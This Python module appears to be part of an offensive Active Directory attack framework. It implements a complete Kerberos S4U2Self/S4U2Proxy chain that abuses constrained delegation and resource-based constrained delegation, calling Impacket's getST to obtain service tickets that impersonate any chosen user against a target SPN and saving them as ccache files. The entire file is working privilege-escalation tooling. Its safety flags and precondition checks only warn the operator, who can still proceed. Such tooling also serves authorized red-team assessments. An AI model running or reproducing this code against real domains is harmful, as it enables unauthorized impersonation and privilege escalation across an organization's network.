"""S4U2Self + S4U2Proxy end-to-end chain.

Given a controlled account with delegation rights (msDS-AllowedToDelegateTo,
RBCD, or self-delegation), request a service ticket that impersonates an
arbitrary user against the specified SPN.

Preconditions are checked against the session graph when available so operators
see evidence of effective rights before the ticket request is made.
"""

from __future__ import annotations

import json
import os
from pathlib import Path
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.registry import (
    ApprovalPolicy,
    RiskLevel,
    RollbackClass,
    SafetyProfile,
    register_capability,
)
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


def _precondition_evidence(graph: AttackGraph, controller: str | None) -> dict[str, Any]:
    """Summarize delegation-related edges that justify an S4U attempt."""
    evidence: list[dict[str, str]] = []
    relations = {
        "AllowedToAct",
        "WriteRBCD",
        "AllowedToDelegate",
        "UnconstrainedDelegation",
        "CanDelegateTo",
    }
    controller_upper = (controller or "").upper()
    for edge in graph.edges:
        if edge.kind not in relations:
            continue
        if controller_upper and controller_upper not in edge.source.upper():
            # Still record domain-wide evidence; mark whether it matches controller
            match = False
        else:
            match = True
        evidence.append(
            {
                "relation": edge.kind,
                "source": edge.source,
                "target": edge.target,
                "controller_match": str(match),
            }
        )
    return {
        "evidence_count": len(evidence),
        "evidence": evidence[:30],
        "has_rbcd_signal": any(e["relation"] in {"AllowedToAct", "WriteRBCD"} for e in evidence),
        "has_constrained_signal": any(
            e["relation"] in {"AllowedToDelegate", "CanDelegateTo"} for e in evidence
        ),
    }


@register_capability(
    id="s4u-abuse",
    summary="Full S4U2Self + S4U2Proxy chain (constrained delegation / RBCD abuse)",
    category="privilege-escalation",
    tags=("kerberos", "s4u", "constrained-delegation", "rbcd", "multi-hop"),
    safety=SafetyProfile(
        risk=RiskLevel.SIDE_EFFECT,
        approval=ApprovalPolicy.FORCE_AND_ACK,
        rollback=RollbackClass.NONE,
        network_side_effect=True,
        exposes_credentials=True,
    ),
)
class S4uAbuse:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("s4u-abuse")
        impersonate = kwargs.get("impersonate")
        spn = kwargs.get("spn")
        additional_ticket = kwargs.get("additional_ticket")
        altservice = kwargs.get("altservice")
        if not impersonate or not spn:
            raise RuntimeError("Requires -P impersonate=<user> and -P spn=<service/host>.")
        if not target.username or not target.has_credentials:
            raise RuntimeError("s4u-abuse requires --username plus password/hash/aes/ccache.")

        # Load prior graph evidence when the in-memory graph is empty
        if not graph.nodes:
            graph_path = Path(kwargs.get("graph_path") or session.path("graph.json"))
            if graph_path.is_file():
                graph = AttackGraph.from_file(graph_path)

        preconditions = _precondition_evidence(graph, target.username)
        console.print(
            f"[bold]S4U chain[/bold] {target.username} → impersonate {impersonate} → {spn}"
        )
        console.print(
            f"  graph evidence: rbcd={preconditions['has_rbcd_signal']}  "
            f"constrained={preconditions['has_constrained_signal']}  "
            f"edges={preconditions['evidence_count']}"
        )
        if (
            not preconditions["has_rbcd_signal"]
            and not preconditions["has_constrained_signal"]
            and not force
        ):
            console.print(
                "[yellow]No RBCD/constrained-delegation edges in the current graph. "
                "Proceeding anyway (operator-supplied credentials may still work). "
                "Use --force to suppress this notice.[/yellow]"
            )

        from adaf_attack.core.impacket_scripts import load_impacket_example

        getst_cls = load_impacket_example("getST.py", "GETST")
        options = _GetSTOptions(
            identity=f"{target.domain}/{target.username}",
            spn=spn,
            impersonate=impersonate,
            additional_ticket=additional_ticket,
            altservice=altservice,
            dc_ip=target.dc_ip,
            k=target.use_kerberos,
            no_pass=not target.password and not target.hashes and not target.aes_key,
            hashes=target.hashes or "",
            aesKey=target.aes_key or "",
            debug=False,
            self_flag=bool(kwargs.get("self_flag")),
            u2u=bool(kwargs.get("u2u")),
            dmsa=bool(kwargs.get("dmsa")),
            no_s4u2proxy=bool(kwargs.get("no_s4u2proxy")),
            renewable_life="",
            renewable=False,
            force_forwardable=False,
            renew=False,
        )
        # Impacket getST reads options.self; cannot pass self= into __init__.
        options.self = bool(kwargs.get("self_flag") or kwargs.get("self"))
        out_dir = session.path("s4u")
        os.makedirs(out_dir, exist_ok=True)
        cwd = os.getcwd()
        os.chdir(out_dir)
        try:
            executor = getst_cls(
                target.username or "",
                target.password or "",
                target.domain,
                options,
            )
            executor.run()
        finally:
            os.chdir(cwd)

        ccaches = [str(out_dir / n) for n in os.listdir(out_dir) if n.endswith(".ccache")]
        node = f"USER@{impersonate.upper()}@{target.domain.upper()}"
        graph.add_node(node, "User", sam=impersonate, source="s4u")
        graph.add_edge(node, node, "HasS4UTicket", spn=spn)
        if altservice:
            graph.add_edge(node, f"SPN@{str(altservice).upper()}", "S4UAlternateService")

        result = {
            "impersonate": impersonate,
            "spn": spn,
            "additional_ticket": additional_ticket,
            "altservice": altservice,
            "controller": target.username,
            "preconditions": preconditions,
            "ccache_paths": ccaches,
            "multi_hop": bool(additional_ticket),
        }
        out = session.path("s4u-abuse.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "s4u-abuse.complete",
            impersonate=impersonate,
            spn=spn,
            ccaches=len(ccaches),
            multi_hop=bool(additional_ticket),
        )
        console.print(
            f"[green]Done[/green]  ccaches={len(ccaches)}  multi_hop={bool(additional_ticket)}"
        )
        return result


class _GetSTOptions:
    self: bool = False

    def __init__(self, **kw: Any) -> None:
        for key, val in kw.items():
            setattr(self, key, val)
